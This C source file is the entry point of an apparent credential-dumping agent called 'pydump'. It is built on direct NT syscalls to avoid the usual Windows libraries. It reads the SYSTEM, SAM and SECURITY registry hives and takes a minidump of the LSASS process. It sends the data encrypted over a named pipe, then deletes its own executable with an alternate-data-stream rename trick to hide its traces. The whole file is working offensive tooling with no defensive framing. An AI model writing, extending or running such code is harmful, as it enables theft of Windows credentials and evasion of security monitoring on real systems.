/**
 * pydump agent — entry point. Zero kernel32/advapi32 dependencies.
 * Command line: agent.exe <MODE> <PID> <OUTPUT_NAME>
 *   mode & 4 = hive file reads (NtCreateFile + NtReadFile)
 *   mode & 2 = LSASS minidump
 *   mode & 1 = structured registry API reads (legacy)
 * Protocol: "PYD\x03" + registry section + LSASS MDMP.
 */

#include <windows.h>
#include "../include/syscalls.h"
#include "../include/agent.h"
#include "../include/registry.h"

/* ── Helpers ─────────────────────────────────────────────── */

static DWORD wtoi(const wchar_t *s) {
    DWORD val = 0;
    while (*s >= L'0' && *s <= L'9') {
        val = val * 10 + (*s - L'0');
        s++;
    }
    return val;
}

/* ── Self-delete via NtSetInformationFile ────────────────── */

static void self_delete(void) {
    PUNICODE_STRING img_path = get_image_path();
    if (!img_path || !img_path->Buffer || !img_path->Length) return;

    wchar_t nt_path[520];
    nt_path[0] = L'\\';
    nt_path[1] = L'?';
    nt_path[2] = L'?';
    nt_path[3] = L'\\';
    int off = 4;

    wchar_t *src = img_path->Buffer;
    USHORT src_chars = img_path->Length / sizeof(wchar_t);
    for (USHORT i = 0; i < src_chars && off < 518; i++) {
        nt_path[off++] = src[i];
    }
    nt_path[off] = L'\0';

    UNICODE_STRING us;
    us.Length = (USHORT)(off * sizeof(wchar_t));
    us.MaximumLength = (USHORT)((off + 1) * sizeof(wchar_t));
    us.Buffer = nt_path;

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);

    IO_STATUS_BLOCK iosb;
    HANDLE hFile = NULL;

    NTSTATUS status = sys_NtCreateFile(
        &hFile,
        0x00010000 | 0x00100000, /* DELETE | SYNCHRONIZE */
        &oa, &iosb, NULL, 0,
        FILE_SHARE_READ | FILE_SHARE_DELETE,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
        NULL, 0
    );
    if (!NT_SUCCESS(status)) return;

    struct {
        BOOLEAN ReplaceIfExists;
        BYTE    pad[7];
        HANDLE  RootDirectory;
        ULONG   FileNameLength;
        WCHAR   FileName[2];
    } rename_info;
    rename_info.ReplaceIfExists = 0;
    rename_info.pad[0] = 0; rename_info.pad[1] = 0; rename_info.pad[2] = 0;
    rename_info.pad[3] = 0; rename_info.pad[4] = 0; rename_info.pad[5] = 0;
    rename_info.pad[6] = 0;
    rename_info.RootDirectory = NULL;
    rename_info.FileNameLength = 4;
    rename_info.FileName[0] = L':';
    rename_info.FileName[1] = L'x';

    status = sys_NtSetInformationFile(hFile, &iosb, &rename_info,
                                       sizeof(rename_info), FileRenameInformation);
    sys_NtClose(hFile);
    if (!NT_SUCCESS(status)) return;

    status = sys_NtCreateFile(
        &hFile,
        0x00010000 | 0x00100000, /* DELETE | SYNCHRONIZE */
        &oa, &iosb, NULL, 0,
        FILE_SHARE_READ | FILE_SHARE_DELETE,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
        NULL, 0
    );
    if (!NT_SUCCESS(status)) return;

    FILE_DISPOSITION_INFORMATION disp;
    disp.DeleteFile = TRUE;
    sys_NtSetInformationFile(hFile, &iosb, &disp, sizeof(disp), FileDispositionInformation);
    sys_NtClose(hFile);
}

/* ── Entry point ─────────────────────────────────────────── */

void main_entry(void) {
    PUNICODE_STRING cmdline_us = get_command_line();
    if (!cmdline_us || !cmdline_us->Buffer) {
        sys_NtTerminateProcess((HANDLE)-1, 1);
        return;
    }

    wchar_t *p = cmdline_us->Buffer;

    /* Skip executable name */
    if (*p == L'"') {
        p++;
        while (*p && *p != L'"') p++;
        if (*p) p++;
    } else {
        while (*p && *p != L' ') p++;
    }
    while (*p == L' ') p++;

    /* Parse MODE */
    DWORD mode = wtoi(p);
    while (*p && *p != L' ') p++;
    while (*p == L' ') p++;

    /* Parse PID */
    DWORD pid = wtoi(p);
    while (*p && *p != L' ') p++;
    while (*p == L' ') p++;

    /* Output name */
    wchar_t *out_name = p;
    wchar_t *end = out_name;
    while (*end && *end != L' ' && *end != L'\r' && *end != L'\n') end++;
    *end = L'\0';

    if (mode == 0 || out_name[0] == L'\0') {
        sys_NtTerminateProcess((HANDLE)-1, 1);
        return;
    }

    if (!resolve_syscalls()) {
        sys_NtTerminateProcess((HANDLE)-1, 2);
        return;
    }

    HANDLE pipe = open_named_pipe(out_name);
    if (!pipe) {
        sys_NtTerminateProcess((HANDLE)-1, 3);
        return;
    }

    init_pipe_cipher(out_name);

    BYTE magic[4] = {'P', 'Y', 'D', 0x03};
    write_pipe(pipe, magic, 4);

    /* Registry: hive file reads (mode 4) or structured API reads (mode 1) */
    if (mode & 4) {
        init_registry();
        dump_hive_files(pipe);
    } else if (mode & 1) {
        init_registry();
        dump_registry_hives(pipe);
    } else {
        DWORD zero = 0;
        write_pipe(pipe, &zero, 4); /* system_len = 0 */
        write_pipe(pipe, &zero, 4); /* sam_len = 0 */
        write_pipe(pipe, &zero, 4); /* security_len = 0 */
    }

    /* LSASS minidump */
    BOOL success = TRUE;
    if (mode & 2) {
        success = dump_lsass(pid, pipe);
    }

    close_pipe(pipe);
    self_delete();

    sys_NtTerminateProcess((HANDLE)-1, success ? 0 : 4);
}
